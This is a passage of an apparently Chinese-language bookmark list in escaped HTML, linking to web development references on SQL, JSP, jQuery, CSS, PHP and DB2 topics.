rel=\"noopener\">http://www.finereport.com/tw/knowledge/acquire/jasperreportsireport.html</a></p>\n<p>webservice - 什么是 RESTful ？到底 REST 和 SOAP、RPC 有何区别？ - SegmentFault<br><a href=\"https://segmentfault.com/q/1010000003064904\" target=\"_blank\" rel=\"noopener\">https://segmentfault.com/q/1010000003064904</a></p>\n<p>[Pre-Class]SOAP-RPC | 宅學習 - Social Learning Space<br><a href=\"https://sls.weco.net/blog/keooen/18-may-2007/3743\" target=\"_blank\" rel=\"noopener\">https://sls.weco.net/blog/keooen/18-may-2007/3743</a></p>\n<p>python - Pythonic Circular List - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/8951020/pythonic-circular-list\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/8951020/pythonic-circular-list</a></p>\n<p>aureooms/js-itertools API Document<br><a href=\"http://aureooms.github.io/js-itertools/\" target=\"_blank\" rel=\"noopener\">http://aureooms.github.io/js-itertools/</a></p>\n<p>Handling Keyboard Shortcuts in JavaScript<br><a href=\"http://www.openjs.com/scripts/events/keyboard_shortcuts/\" target=\"_blank\" rel=\"noopener\">http://www.openjs.com/scripts/events/keyboard_shortcuts/</a></p>\n<p>About (Command Line)<br><a href=\"https://msdn.microsoft.com/zh-tw/library/y5e47585(v=vs.80).aspx\" target=\"_blank\" rel=\"noopener\">https://msdn.microsoft.com/zh-tw/library/y5e47585(v=vs.80).aspx</a></p>\n<p>win8 網路芳鄰/網鄰 區網共用該如何登出帳號 @ 【R 記錄】 :: 隨意窩 Xuite 日誌<br><a href=\"http://blog.xuite.net/sunnysoap/\" target=\"_blank\" rel=\"noopener\">http://blog.xuite.net/sunnysoap/</a><br>r/150810217-win8%E7%B6%B2%E8%B7%AF%E8%8A%B3%E9%84%B0%2F%E7%B6%B2%E9%84%B0+%E5%8D%80%E7%B6%B2%E5%85%B1%E7%94%A8%E8%A9%B2%E5%A6%82%E4%BD%95%E7%99%BB%E5%87%BA%E5%B8%B3%E8%99%9F<br>EmEditor 說明<br><a href=\"http://www.emeditor.org/zh-tw/index.html\" target=\"_blank\" rel=\"noopener\">http://www.emeditor.org/zh-tw/index.html</a></p>\n<p>用 MSBuild 完成 Daily Build 工作! | 心牆記事<br><a href=\"https://lex0912.wordpress.com/2006/02/18/%e7%94%a8msbuild%e5%ae%8c%e6%88%90daily-build%e5%b7%a5%e4%bd%9c/\" target=\"_blank\" rel=\"noopener\">https://lex0912.wordpress.com/2006/02/18/%e7%94%a8msbuild%e5%ae%8c%e6%88%90daily-build%e5%b7%a5%e4%bd%9c/</a></p>\n<p>Command Line Commands<br><a href=\"https://msdn.microsoft.com/zh-tw/library/003ssz4z(v=vs.80).aspx\" target=\"_blank\" rel=\"noopener\">https://msdn.microsoft.com/zh-tw/library/003ssz4z(v=vs.80).aspx</a></p>\n<p>language agnostic - Getting parts of a URL (Regex) - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/27745/getting-parts-of-a-url-regex\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/27745/getting-parts-of-a-url-regex</a></p>\n<p>getRemoteAddr()和 getRemoteHost() 区别 - tanyit 的专栏 - 博客频道 - CSDN.NET<br><a href=\"http://blog.csdn.net/tanyit/article/details/6925317\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/tanyit/article/details/6925317</a></p>\n<p>JSP 开发中 request 对象 URL 方法对照表<br><a href=\"http://www.360doc.com/content/09/0310/11/18042_2765380.shtml\" target=\"_blank\" rel=\"noopener\">http://www.360doc.com/content/09/0310/11/18042_2765380.shtml</a></p>\n<p>[javascript]自動補 0 @ 資訊園 :: 痞客邦 PIXNET ::<br><a href=\"http://fecbob.pixnet.net/blog/post/43057789-%5Bjavascript%5D%E8%87%AA%E5%8B%95%E8%A3%9C0\" target=\"_blank\" rel=\"noopener\">http://fecbob.pixnet.net/blog/post/43057789-%5Bjavascript%5D%E8%87%AA%E5%8B%95%E8%A3%9C0</a></p>\n<p>select 下拉選單有像 input 的 READONLY 功能嗎？？- 藍色小舖 BlueShop<br><a href=\"http://www.blueshop.com.tw/board/FUM20041006152641OLG/BRD20060120131403ULG.html\" target=\"_blank\" rel=\"noopener\">http://www.blueshop.com.tw/board/FUM20041006152641OLG/BRD20060120131403ULG.html</a></p>\n<p>getRequestURI,getRequestURL 的区别 - 草原和大树 - 博客园<br><a href=\"http://www.cnblogs.com/JemBai/archive/2010/11/10/1873764.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/JemBai/archive/2010/11/10/1873764.html</a></p>\n<p>websphere 错误备忘录 - ITPUB 论坛－中国最专业的 IT 技术社区 - Powered by Discuz!<br><a href=\"http://www.itpub.net/forum.php?mod=viewthread&amp;action=printable&amp;tid=737720\" target=\"_blank\" rel=\"noopener\">http://www.itpub.net/forum.php?mod=viewthread&amp;action=printable&amp;tid=737720</a></p>\n<p>IT 隨筆: 二維陣列@Javascript<br><a href=\"http://leancoding.blogspot.tw/2008/01/javascript_20.html\" target=\"_blank\" rel=\"noopener\">http://leancoding.blogspot.tw/2008/01/javascript_20.html</a></p>\n<p>JavaScript 判斷輸入日期格式是否為 YYYY/MM/DD<br><a href=\"http://www.eion.com.tw/Blogger/?Pid=1047\" target=\"_blank\" rel=\"noopener\">http://www.eion.com.tw/Blogger/?Pid=1047</a></p>\n<p>………………..: 判斷日期是否合法<br><a href=\"http://evabow.blogspot.tw/2008/12/blog-post_31.html\" target=\"_blank\" rel=\"noopener\">http://evabow.blogspot.tw/2008/12/blog-post_31.html</a></p>\n<p>Java 集合系列 11 之 Hashtable 详细介绍(源码解析)和使用示例 - 如果天空不死 - 博客园<br><a href=\"http://www.cnblogs.com/skywang12345/p/3310887.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/skywang12345/p/3310887.html</a></p>\n<p>jQuery .data()與.attr()筆記兩則 - 黑暗執行緒<br><a href=\"http://blog.darkthread.net/post-2011-10-25-jquery-data-attr-notes.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.darkthread.net/post-2011-10-25-jquery-data-attr-notes.aspx</a></p>\n<p>響應式網頁設計 Responsive Web Design - 貼文<br><a href=\"https://www.facebook.com/permalink.php?id=425857327476777&amp;story_fbid=750765554985951\" target=\"_blank\" rel=\"noopener\">https://www.facebook.com/permalink.php?id=425857327476777&amp;story_fbid=750765554985951</a></p>\n<p>kendoui 导出 pdf 中文变方块有解决办法么？-开发者论坛 - Powered by Discuz!<br><a href=\"http://www.dxper.net/thread-4299-1-1.html\" target=\"_blank\" rel=\"noopener\">http://www.dxper.net/thread-4299-1-1.html</a></p>\n<p>Eclipse 解決導出 apk 時 strings.xml 發生錯誤的問題 @ Yang 的部落格 :: 痞客邦 PIXNET ::<br><a href=\"http://oblivious9.pixnet.net/blog/post/61286619-eclipse%E8%A7%A3%E6%B1%BA%E5%B0%8E%E5%87%BAapk%E6%99%82strings.xml%E7%99%BC%E7%94%9F%E9%8C%AF%E8%AA%A4%E7%9A%84%E5%95%8F%E9%A1%8C\" target=\"_blank\" rel=\"noopener\">http://oblivious9.pixnet.net/blog/post/61286619-eclipse%E8%A7%A3%E6%B1%BA%E5%B0%8E%E5%87%BAapk%E6%99%82strings.xml%E7%99%BC%E7%94%9F%E9%8C%AF%E8%AA%A4%E7%9A%84%E5%95%8F%E9%A1%8C</a></p>\n<p>Best HTML and CSS Cheat Sheets » CSS Author<br><a href=\"http://www.cssauthor.com/html-and-css-cheat-sheets/\" target=\"_blank\" rel=\"noopener\">http://www.cssauthor.com/html-and-css-cheat-sheets/</a></p>\n<p>jQuery :: plugin :: 中文、英數字 bytes 計算與驗證 - JSFiddle<br><a href=\"http://jsfiddle.net/yelmous/gzub1xoz/\" target=\"_blank\" rel=\"noopener\">http://jsfiddle.net/yelmous/gzub1xoz/</a></p>\n<p>只需要懂 Jquery 也能學 react js<br><a href=\"https://www.slideshare.net/JustinWu13/j-queryreact-js\" target=\"_blank\" rel=\"noopener\">https://www.slideshare.net/JustinWu13/j-queryreact-js</a></p>\n<p>patw0929/jquery.chineselengthlimit: 這是一個可以限制 文字框（input[type=’text’]） 與 文字輸入區域（textarea） 輸入 中英文字數 的 jQuery Plugin。<br><a href=\"https://github.com/patw0929/jquery.chineselengthlimit\" target=\"_blank\" rel=\"noopener\">https://github.com/patw0929/jquery.chineselengthlimit</a></p>\n<p>jQuery Chinese Characters Length Limit Plugin 1.0 - Partner Studio<br><a href=\"https://blog.patw.me/archives/615/jquery-chinese-characters-length-limit-plugin-1-0/\" target=\"_blank\" rel=\"noopener\">https://blog.patw.me/archives/615/jquery-chinese-characters-length-limit-plugin-1-0/</a></p>\n<p>PChome 線上購物 -<br><a href=\"http://24h.pchome.com.tw/prod/DAAO09-A9005S8HX\" target=\"_blank\" rel=\"noopener\">http://24h.pchome.com.tw/prod/DAAO09-A9005S8HX</a></p>\n<p>居米の筆記: [Javascript]如何讓 IE9, IE8, IE7, IE6 關閉視窗時不彈出對話訊息<br><a href=\"http://coding-online.blogspot.tw/2011/12/javascriptie9-ie8-ie7-ie6.html\" target=\"_blank\" rel=\"noopener\">http://coding-online.blogspot.tw/2011/12/javascriptie9-ie8-ie7-ie6.html</a></p>\n<p>javascript 取得 radio 的值 | [lifeIs: tooShort to: waste]<br><a href=\"https://blog.hsin.tw/2008/javascript-form-radio/\" target=\"_blank\" rel=\"noopener\">https://blog.hsin.tw/2008/javascript-form-radio/</a></p>\n<p>Stanley’s 部落格: DB2 日期時間相減<br><a href=\"http://stanleyjian.blogspot.tw/2015/03/db2.html\" target=\"_blank\" rel=\"noopener\">http://stanleyjian.blogspot.tw/2015/03/db2.html</a></p>\n<p>about:blank<br>about:blank</p>\n<p>Web Worker 經驗分享(一) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天<br><a href=\"http://ithelp.ithome.com.tw/articles/10118851\" target=\"_blank\" rel=\"noopener\">http://ithelp.ithome.com.tw/articles/10118851</a></p>\n<p><a href=\"http://mtrsoftware.com.tw/Page_L/ICD9.htm\" target=\"_blank\" rel=\"noopener\">http://mtrsoftware.com.tw/Page_L/ICD9.htm</a><br><a href=\"http://mtrsoftware.com.tw/Page_L/ICD9.htm\" target=\"_blank\" rel=\"noopener\">http://mtrsoftware.com.tw/Page_L/ICD9.htm</a></p>\n<p>人生七劃: SQL 教學<br><a href=\"http://kareslion.blogspot.com/search/label/SQL%E6%95%99%E5%AD%B8\" target=\"_blank\" rel=\"noopener\">http://kareslion.blogspot.com/search/label/SQL%E6%95%99%E5%AD%B8</a></p>\n<p>未來時間計算<br><a href=\"https://www.ifreesite.com/calculatortool/date.htm\" target=\"_blank\" rel=\"noopener\">https://www.ifreesite.com/calculatortool/date.htm</a></p>\n<p>httpbin(1): HTTP Client Testing Service<br><a href=\"https://httpbin.org/\" target=\"_blank\" rel=\"noopener\">https://httpbin.org/</a></p>\n<p>SQL 子句执行顺序和 Join 的一点总结 - BobLiu - 博客园<br><a href=\"http://www.cnblogs.com/liuzhendong/archive/2011/10/27/2226805.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/liuzhendong/archive/2011/10/27/2226805.html</a></p>\n<p>兼愛非攻~: SELECT 基礎 2[子查詢與查詢多個資料來源]<br><a href=\"http://mohist1.blogspot.tw/2014/10/select-2.html\" target=\"_blank\" rel=\"noopener\">http://mohist1.blogspot.tw/2014/10/select-2.html</a></p>\n<p>SQL 中 left join 中 on 和 where 的执行顺序解析<em>FANtastic</em>新浪博客<br><a href=\"http://blog.sina.com.cn/s/blog_6826662b0101atu1.html\" target=\"_blank\" rel=\"noopener\">http://blog.sina.com.cn/s/blog_6826662b0101atu1.html</a></p>\n<p>Java 程式教學甘仔店: [MySQL]執行順序與效率概論<br><a href=\"http://pclevin.blogspot.tw/2011/12/mysql_24.html\" target=\"_blank\" rel=\"noopener\">http://pclevin.blogspot.tw/2011/12/mysql_24.html</a></p>\n<p>茫茫網海中的冷日 - [轉貼]MSSQL Join 總結<br><a href=\"http://www.coolsun.idv.tw/modules/xhnewbb/viewtopic.php?topic_id=1320\" target=\"_blank\" rel=\"noopener\">http://www.coolsun.idv.tw/modules/xhnewbb/viewtopic.php?topic_id=1320</a></p>\n<p>SQL JOIN 語法順序與效能之推論 | InspireGate 派克空間<br><a href=\"http://inspiregate.com/programming/mysql/303-sql-join-syntax-and-performance-of-inference-in-order.html\" target=\"_blank\" rel=\"noopener\">http://inspiregate.com/programming/mysql/303-sql-join-syntax-and-performance-of-inference-in-order.html</a></p>\n<p>[教學]如何在 Windows 上使用 Sublime Text 2 編譯 Java 檔案？ | 香港三兄弟部落格 - 3Bro Blog HK | 香港 IT 部落格 | 電腦、軟件、網絡及智能手機最新資訊<br><a href=\"https://blog.3bro.info/archives/windows-compile-java-sublime-text/\" target=\"_blank\" rel=\"noopener\">https://blog.3bro.info/archives/windows-compile-java-sublime-text/</a></p>\n<p><a href=\"http://www.searchstarters.com/?dn=erufa.com&amp;pid=9PO1NMIEC\" target=\"_blank\" rel=\"noopener\">http://www.searchstarters.com/?dn=erufa.com&amp;pid=9PO1NMIEC</a><br><a href=\"http://www.searchstarters.com/?dn=erufa.com&amp;pid=9PO1NMIEC\" target=\"_blank\" rel=\"noopener\">http://www.searchstarters.com/?dn=erufa.com&amp;pid=9PO1NMIEC</a></p>\n<p>JSP 中一些有關網址的資訊 @ 吉米兔的學習園地 :: 隨意窩 Xuite 日誌<br><a href=\"http://blog.xuite.net/jimmytwo/km/15151450-JSP%E4%B8%AD%E4%B8%80%E4%BA%9B%E6%9C%89%E9%97%9C%E7%B6%B2%E5%9D%80%E7%9A%84%E8%B3%87%E8%A8%8A\" target=\"_blank\" rel=\"noopener\">http://blog.xuite.net/jimmytwo/km/15151450-JSP%E4%B8%AD%E4%B8%80%E4%BA%9B%E6%9C%89%E9%97%9C%E7%B6%B2%E5%9D%80%E7%9A%84%E8%B3%87%E8%A8%8A</a></p>\n<p><a href=\"https://www.toadworld.com/platforms/ibmdb2/w/wiki/6738.update-and-delete-with-subselects\" target=\"_blank\" rel=\"noopener\">https://www.toadworld.com/platforms/ibmdb2/w/wiki/6738.update-and-delete-with-subselects</a><br><a href=\"https://www.toadworld.com/platforms/ibmdb2/w/wiki/6738.update-and-delete-with-subselects\" target=\"_blank\" rel=\"noopener\">https://www.toadworld.com/platforms/ibmdb2/w/wiki/6738.update-and-delete-with-subselects</a></p>\n<p>update 中加入 select 最常用的 update 语法  (转)<em>colindcli</em>新浪博客<br><a href=\"http://blog.sina.com.cn/s/blog_5e06afe00100ko51.html\" target=\"_blank\" rel=\"noopener\">http://blog.sina.com.cn/s/blog_5e06afe00100ko51.html</a></p>\n<p>[CSS] Overflow 清除 Float 效果的妙用<br><a href=\"http://www.mrmu.com.tw/2011/02/19/css-overflow-clear-float/\" target=\"_blank\" rel=\"noopener\">http://www.mrmu.com.tw/2011/02/19/css-overflow-clear-float/</a></p>\n<p>internet explorer 8 - How can I get IE8 to accept a CSS :before tag? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/2546251/how-can-i-get-ie8-to-accept-a-css-before-tag\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/2546251/how-can-i-get-ie8-to-accept-a-css-before-tag</a></p>\n<p><a href=\"http://blog.miniasp.com/post/2009/03/25/location-href-and-location-replace-in-practice.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.miniasp.com/post/2009/03/25/location-href-and-location-replace-in-practice.aspx</a><br><a href=\"http://blog.miniasp.com/post/2009/03/25/location-href-and-location-replace-in-practice.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.miniasp.com/post/2009/03/25/location-href-and-location-replace-in-practice.aspx</a></p>\n<p>黑貓宅急便<br><a href=\"http://www.t-cat.com.tw/Inquire/TraceDetail.aspx?BillID=9181640034&amp;ReturnUrl=Trace.aspx\" target=\"_blank\" rel=\"noopener\">http://www.t-cat.com.tw/Inquire/TraceDetail.aspx?BillID=9181640034&amp;ReturnUrl=Trace.aspx</a></p>\n<p>Free 學習札記: DB2: Get current date with format YYYYMMDD<br><a href=\"http://mark-freefox.blogspot.tw/2013/08/db2-get-current-date-with-format.html\" target=\"_blank\" rel=\"noopener\">http://mark-freefox.blogspot.tw/2013/08/db2-get-current-date-with-format.html</a></p>\n<p>[鐵人賽 Day2] GET/POST 的差異與配合 PHP 用法 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天<br><a href=\"http://ithelp.ithome.com.tw/articles/10155801\" target=\"_blank\" rel=\"noopener\">http://ithelp.ithome.com.tw/articles/10155801</a></p>\n<p>[T-SQL] with 語法<br><a href=\"http://ysde.blogspot.tw/2009/05/sql-with.html\" target=\"_blank\" rel=\"noopener\">http://ysde.blogspot.tw/2009/05/sql-with.html</a></p>\n<p>SQL 基礎語法(一) @ Jiang Ying-Fu 的部落格 :: 痞客邦 PIXNET ::<br><a href=\"http://fireleominor.pixnet.net/blog/post/50135569-sql%E5%9F%BA%E7%A4%8E%E8%AA%9E%E6%B3%95(%E4%B8%80)\" target=\"_blank\" rel=\"noopener\">http://fireleominor.pixnet.net/blog/post/50135569-sql%E5%9F%BA%E7%A4%8E%E8%AA%9E%E6%B3%95(%E4%B8%80)</a></p>\n<p><a href=\"http://sql.yehyeh.net/content/Subqueries.php\" target=\"_blank\" rel=\"noopener\">http://sql.yehyeh.net/content/Subqueries.php</a><br><a href=\"http://sql.yehyeh.net/content/Subqueries.php\" target=\"_blank\" rel=\"noopener\">http://sql.yehyeh.net/content/Subqueries.php</a></p>\n<p>SQL Query 最佳化小小心得分享(Part I) / SQL Language / 程式設計俱樂部<br><a href=\"http://www.programmer-club.com.tw/ShowSameTitleN/sqllanguage/255.html\" target=\"_blank\" rel=\"noopener\">http://www.programmer-club.com.tw/ShowSameTitleN/sqllanguage/255.html</a></p>\n<p>Acoak.com<br><a href=\"http://blog.acoak.com/article/php-session-principle\" target=\"_blank\" rel=\"noopener\">http://blog.acoak.com/article/php-session-principle</a></p>\n<p>HttpSession 原理<br><a href=\"https://openhome.cc/Gossip/ServletJSP/BehindHttpSession.html\" target=\"_blank\" rel=\"noopener\">https://openhome.cc/Gossip/ServletJSP/BehindHttpSession.html</a></p>\n<p>常用的 CSS pseudo class (CSS 偽類) 教學與練習 - PART1 &amp; Yijen’s blog - hanasan # 天空部落 TIAN #<br><a href=\"http://hanasan.tian.yam.com/posts/93231753\" target=\"_blank\" rel=\"noopener\">http://hanasan.tian.yam.com/posts/93231753</a></p>\n<p>頁面載入發生問題<br><a href=\"https://jishus.org/?p=651\" target=\"_blank\" rel=\"noopener\">https://jishus.org/?p=651</a></p>\n<p>頁面載入發生問題<br><a href=\"http://diary.blog.yam.com/shelbypercy/article/10143969\" target=\"_blank\" rel=\"noopener\">http://diary.blog.yam.com/shelbypercy/article/10143969</a></p>\n<p>JWorld@TW Java 論壇 - [新手必看] Java 字串的比較<br><a href=\"https://www.javaworld.com.tw/jute/post/view?bid=29&amp;id=15157&amp;sty=1&amp;tpg=1&amp;age=0\" target=\"_blank\" rel=\"noopener\">https://www.javaworld.com.tw/jute/post/view?bid=29&amp;id=15157&amp;sty=1&amp;tpg=1&amp;age=0</a></p>\n<p>gist:4389638<br><a href=\"https://gist.github.com/stanleytamta/4389638\" target=\"_blank\" rel=\"noopener\">https://gist.github.com/stanleytamta/4389638</a></p>\n<p>高性能、最终一致性的数据同步方案<br><a href=\"https://www.dozer.cc/2015/03/etl.html\" target=\"_blank\" rel=\"noopener\">https://www.dozer.cc/2015/03/etl.html</a></p>\n<p>database - accdb and PDO php connection error - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/13787686/accdb-and-pdo-php-connection-error\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/13787686/accdb-and-pdo-php-connection-error</a></p>\n<p>CSS: centering things<br><a href=\"https://www.w3.org/Style/Examples/007/center.en.html\" target=\"_blank\" rel=\"noopener\">https://www.w3.org/Style/Examples/007/center.en.html</a></p>\n<p><a href=\"http://abpop23.pixnet.net/blog/post/9901266-php%E8%A8%B1%E5%8A%9F%E8%93%8B%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F\" target=\"_blank\" rel=\"noopener\">http://abpop23.pixnet.net/blog/post/9901266-php%E8%A8%B1%E5%8A%9F%E8%93%8B%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F</a><br><a href=\"http://abpop23.pixnet.net/blog/post/9901266-php%E8%A8%B1%E5%8A%9F%E8%93%8B%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F\" target=\"_blank\" rel=\"noopener\">http://abpop23.pixnet.net/blog/post/9901266-php%E8%A8%B1%E5%8A%9F%E8%93%8B%E8%A7%A3%E6%B1%BA%E6%96%B9%E5%BC%8F</a></p>\n<p>batch file - Running Microsoft Access as a Scheduled Task - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/20245053/running-microsoft-access-as-a-scheduled-task\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/20245053/running-microsoft-access-as-a-scheduled-task</a></p>\n<p>PHP 使用 SQLSRV 連結 MS SQL Server 設定教學 | ucamc<br><a href=\"http://www.ucamc.com/e-learning/computer-skills/146-php-sqlsrv.html\" target=\"_blank\" rel=\"noopener\">http://www.ucamc.com/e-learning/computer-skills/146-php-sqlsrv.html</a></p>\n<p>有捨才有得: [php][pdo]bindParam bindValue 差別<br><a href=\"http://italwaysrainonme.blogspot.com/2012/11/phppdobindparam-bindvalue.html\" target=\"_blank\" rel=\"noopener\">http://italwaysrainonme.blogspot.com/2012/11/phppdobindparam-bindvalue.html</a></p>\n<p>404 Not Found | Peggy Blog!<br><a href=\"http://blog.rx836.tw/blog/jquery-notes-1/\" target=\"_blank\" rel=\"noopener\">http://blog.rx836.tw/blog/jquery-notes-1/</a></p>\n<p>Clear text box in Jquery Autocomplete after selection - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/11607938/clear-text-box-in-jquery-autocomplete-after-selection\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/11607938/clear-text-box-in-jquery-autocomplete-after-selection</a></p>\n<p>[實作] jQuery 新增刪除表格 - 廢人廢業誌<br><a href=\"http://note.junk.tw/2011/12/jquery.html\" target=\"_blank\" rel=\"noopener\">http://note.junk.tw/2011/12/jquery.html</a></p>\n<p>javascript - Add table row in jQuery - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/171027/add-table-row-in-jquery\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/171027/add-table-row-in-jquery</a></p>\n<p>jQuery append fadeIn - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/978708/jquery-append-fadein\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/978708/jquery-append-fadein</a></p>\n<p>jQuery 阻止 input 按 Enter 就送出表單(form) | Web Development Notes<br><a href=\"https://yichen0831.wordpress.com/2013/05/19/jquery%E9%98%BB%E6%AD%A2input%E6%8C%89enter%E5%B0%B1%E9%80%81%E5%87%BA%E8%A1%A8%E5%96%AEform/\" target=\"_blank\" rel=\"noopener\">https://yichen0831.wordpress.com/2013/05/19/jquery%E9%98%BB%E6%AD%A2input%E6%8C%89enter%E5%B0%B1%E9%80%81%E5%87%BA%E8%A1%A8%E5%96%AEform/</a></p>\n<p>有關 JQUERY 操作子元素的方法- 藍色小舖 BlueShop<br><a href=\"http://www.blueshop.com.tw/board/FUM20041006152641OLG/BRD201301091546265VY.html\" target=\"_blank\" rel=\"noopener\">http://www.blueshop.com.tw/board/FUM20041006152641OLG/BRD201301091546265VY.html</a></p>\n<p>Jquery get input array field - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/19529443/jquery-get-input-array-field\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/19529443/jquery-get-input-array-field</a></p>\n<p>Jollen’s PHP 專欄 :: 6. 如何做 PHP 的型別轉換？<br><a href=\"http://www.jollen.org/php/jollen_php_book_6_php.html\" target=\"_blank\" rel=\"noopener\">http://www.jollen.org/php/jollen_php_book_6_php.html</a></p>\n<p>JavaScript 教學 - 資料型態(Data Type) - 上 @ 小殘的程式光廊 :: 痞客邦 PIXNET ::<br><a href=\"http://emn178.pixnet.net/blog/post/94150562-javascript%E6%95%99%E5%AD%B8---%E8%B3%87%E6%96%99%E5%9E%8B%E6%85%8B(data-type)---%E4%B8%8A\" target=\"_blank\" rel=\"noopener\">http://emn178.pixnet.net/blog/post/94150562-javascript%E6%95%99%E5%AD%B8---%E8%B3%87%E6%96%99%E5%9E%8B%E6%85%8B(data-type)---%E4%B8%8A</a></p>\n<p>Ron, Run ~~: PDO - 取得資料的方式<br><a href=\"http://ron314159.blogspot.tw/2013/08/pdo-get-data-methods.html\" target=\"_blank\" rel=\"noopener\">http://ron314159.blogspot.tw/2013/08/pdo-get-data-methods.html</a></p>\n<p>printing - CSS to set A4 paper size - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/16649943/css-to-set-a4-paper-size\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/16649943/css-to-set-a4-paper-size</a></p>\n<p>html - Add border-bottom to table row <tr> - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/10040842/add-border-bottom-to-table-row-tr\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/10040842/add-border-bottom-to-table-row-tr</a></tr></p>\n<p>CSS:print - TestingMediawiki<br><a href=\"https://www.andcycle.idv.tw/mediawiki/index.php/CSS:print\" target=\"_blank\" rel=\"noopener\">https://www.andcycle.idv.tw/mediawiki/index.php/CSS:print</a></p>\n<p>活到老學到老-CSS Media Types - 黑暗執行緒<br><a href=\"http://blog.darkthread.net/post-2009-11-06-css-media-types.aspx\" target=\"_blank\" rel=\"noopener\">http://blog.darkthread.net/post-2009-11-06-css-media-types.aspx</a></p>\n<p>html - How to print table using javascript? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/21375398/how-to-print-table-using-javascript\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/21375398/how-to-print-table-using-javascript</a></p>\n<p><a href=\"http://stockwfj3.pixnet.net/blog/post/61978697-%5Bphp%5Dstr_getcsv-%E8%A7%A3%E6%9E%90%E4%B8%80%E5%80%8B-csv%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%B0%E4%B8%80%E5%80%8B%E6%95%B8%E7%B5%84\" target=\"_blank\" rel=\"noopener\">http://stockwfj3.pixnet.net/blog/post/61978697-%5Bphp%5Dstr_getcsv-%E8%A7%A3%E6%9E%90%E4%B8%80%E5%80%8B-csv%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%B0%E4%B8%80%E5%80%8B%E6%95%B8%E7%B5%84</a><br><a href=\"http://stockwfj3.pixnet.net/blog/post/61978697-%5Bphp%5Dstr_getcsv-%E8%A7%A3%E6%9E%90%E4%B8%80%E5%80%8B-csv%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%B0%E4%B8%80%E5%80%8B%E6%95%B8%E7%B5%84\" target=\"_blank\" rel=\"noopener\">http://stockwfj3.pixnet.net/blog/post/61978697-%5Bphp%5Dstr_getcsv-%E8%A7%A3%E6%9E%90%E4%B8%80%E5%80%8B-csv%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%B0%E4%B8%80%E5%80%8B%E6%95%B8%E7%B5%84</a></p>\n<p>PHP 函式 str_getcsv @ Vexed’s Blog :: 隨意窩 Xuite 日誌<br><a href=\"http://blog.xuite.net/vexed/tech/47476337-PHP+%E5%87%BD%E5%BC%8F+str_getcsv\" target=\"_blank\" rel=\"noopener\">http://blog.xuite.net/vexed/tech/47476337-PHP+%E5%87%BD%E5%BC%8F+str_getcsv</a></p>\n<p><a href=\"http://en.allexperts.com/q/Using-MS-Access-1440/Importing-CSV-MS-Access.htm\" target=\"_blank\" rel=\"noopener\">http://en.allexperts.com/q/Using-MS-Access-1440/Importing-CSV-MS-Access.htm</a><br><a href=\"http://en.allexperts.com/q/Using-MS-Access-1440/Importing-CSV-MS-Access.htm\" target=\"_blank\" rel=\"noopener\">http://en.allexperts.com/q/Using-MS-Access-1440/Importing-CSV-MS-Access.htm</a></p>\n<p>Page not found · GitHub Pages<br><a href=\"http://blog.blackbing.net/post/2014/05/09/javascript-deferred-ordered-task\" target=\"_blank\" rel=\"noopener\">http://blog.blackbing.net/post/2014/05/09/javascript-deferred-ordered-task</a></p>\n<p>010 Better and Better 工程師就業兩年多的心得雜談<br><a href=\"https://www.slideshare.net/BruceLi2/010-better-and-better\" target=\"_blank\" rel=\"noopener\">https://www.slideshare.net/BruceLi2/010-better-and-better</a></p>\n<p>How to make Scrollable Table with fixed headers using CSS - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/19559197/how-to-make-scrollable-table-with-fixed-headers-using-css\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/19559197/how-to-make-scrollable-table-with-fixed-headers-using-css</a></p>\n<p>html - CSS-Only Scrollable Table with fixed headers - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/11891065/css-only-scrollable-table-with-fixed-headers\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/11891065/css-only-scrollable-table-with-fixed-headers</a></p>\n<p>Table with fixed header on scroll<br><a href=\"http://codepen.io/jgx/pen/wiIGc\" target=\"_blank\" rel=\"noopener\">http://codepen.io/jgx/pen/wiIGc</a></p>\n<p>jQuery.Callbacks() | jQuery API 中文文档(适用 jQuery 1.0 - jQuery 3.1)<br><a href=\"http://www.css88.com/jqapi-1.9/jQuery.Callbacks/\" target=\"_blank\" rel=\"noopener\">http://www.css88.com/jqapi-1.9/jQuery.Callbacks/</a></p>\n<p>[Java] 讀取 src 下的設定檔| @ 資訊園 :: 痞客邦 